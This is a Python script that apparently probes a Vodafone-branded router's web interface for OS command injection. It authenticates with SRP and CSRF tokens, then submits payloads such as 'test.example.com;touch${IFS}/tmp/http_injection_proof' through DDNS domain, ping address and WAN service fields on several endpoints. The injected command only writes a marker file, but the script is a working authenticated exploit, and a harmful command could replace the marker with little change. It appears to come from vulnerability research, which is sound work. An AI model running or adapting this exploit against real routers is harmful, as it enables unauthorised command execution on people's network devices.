#!/usr/bin/env python3
"""Non-destructive authenticated DDNS command-injection marker probe."""

import getpass
import time

import requests

from vbnt_z_mysrp import User, SHA256, NG_2048
import binascii
from bs4 import BeautifulSoup


BASE = "http://127.0.0.1:18100"


def csrf(html):
    doc = BeautifulSoup(html, "html.parser")
    tag = doc.find("meta", attrs={"name": "CSRFtoken"})
    if tag:
        return tag.get("content")
    tag = doc.find(attrs={"name": "CSRFtoken"})
    return tag.get("value") if tag else None


def authenticate(session, username, password):
    token = csrf(session.get(BASE + "/", timeout=10).text)
    user = User(username.encode(), password.encode(), hash_alg=SHA256, ng_type=NG_2048)
    name, public = user.start_authentication()
    challenge = session.post(BASE + "/authenticate", data={
        "CSRFtoken": token,
        "I": name.decode(),
        "A": binascii.hexlify(public).decode(),
    }, timeout=10).json()
    proof = user.process_challenge(
        binascii.unhexlify(challenge["s"]),
        binascii.unhexlify(challenge["B"]),
    )
    answer = session.post(BASE + "/authenticate", data={
        "CSRFtoken": token,
        "M": binascii.hexlify(proof).decode(),
    }, timeout=10).json()
    user.verify_session(binascii.unhexlify(answer["M"]))
    if not user.authenticated():
        raise RuntimeError("authentication failed")


def main():
    password = getpass.getpass("Router web password: ")
    session = requests.Session()
    authenticate(session, "vodafone", password)
    payload = "test.example.com;touch${IFS}/tmp/http_injection_proof"
    for path in ("/modals/dns-ddns.lp", "/modals/internet/dns_ddns.lp"):
        page = session.get(BASE + path, timeout=10)
        token = csrf(page.text) or csrf(session.get(BASE + "/", timeout=10).text)
        started = time.monotonic()
        response = session.post(BASE + path, data={
            "CSRFtoken": token,
            "action": "SAVE",
            "ddnsStatus": "1",
            "ddnsService": "dtdns.com",
            "ddnsDomain": payload,
            "ddnsUsrname": "audit",
            "ddnsPswrd": "audit",
            "securedns": "0",
            "manualdns": "0",
            "primarydns": "192.168.1.1",
            "secondarydns": "",
        }, timeout=20)
        print(path, "GET", page.status_code, "POST", response.status_code,
              "seconds", round(time.monotonic() - started, 2),
              "bytes", len(response.content))

    legacy = (
        ("/modals/diagnostics-ping-modal.lp", {
            "action": "PING", "ipAddress": ":::::::;touch${IFS}/tmp/http_injection_proof",
            "NumberOfRepetitions": "3", "DataBlockSize": "64",
        }),
        ("/modals/wanservices-modal.lp", {
            "action": "SAVE", "ddns_domain": "test.com;touch${IFS}/tmp/http_injection_proof",
            "DMZ_enable": "0", "DMZ_destinationip": "", "upnp_status": "0",
            "upnp_natpmp": "0", "upnp_secure_mode": "1", "ddns_enabled": "1",
            "ddns_service_name": "dyndns.org", "ddns_usehttps": "0",
            "ddns_username": "invalid", "ddns_password": "invalid", "fromModal": "YES",
        }),
        ("/dyndns.lp", {
            "action": "SAVE", "ddns_enabled": ["_DUMMY_", "_TRUE_"],
            "ddns_service_name": "dyndns.org",
            "ddns_domain": ":::::::;touch${IFS}/tmp/http_injection_proof",
            "ddns_username": "invalid", "ddns_password": "invalid",
        }),
    )
    for path, data in legacy:
        page = session.get(BASE + path, timeout=10)
        data["CSRFtoken"] = csrf(page.text) or csrf(session.get(BASE + "/", timeout=10).text)
        response = session.post(BASE + path, data=data, timeout=20)
        print(path, "GET", page.status_code, "POST", response.status_code,
              "bytes", len(response.content))


if __name__ == "__main__":
    main()
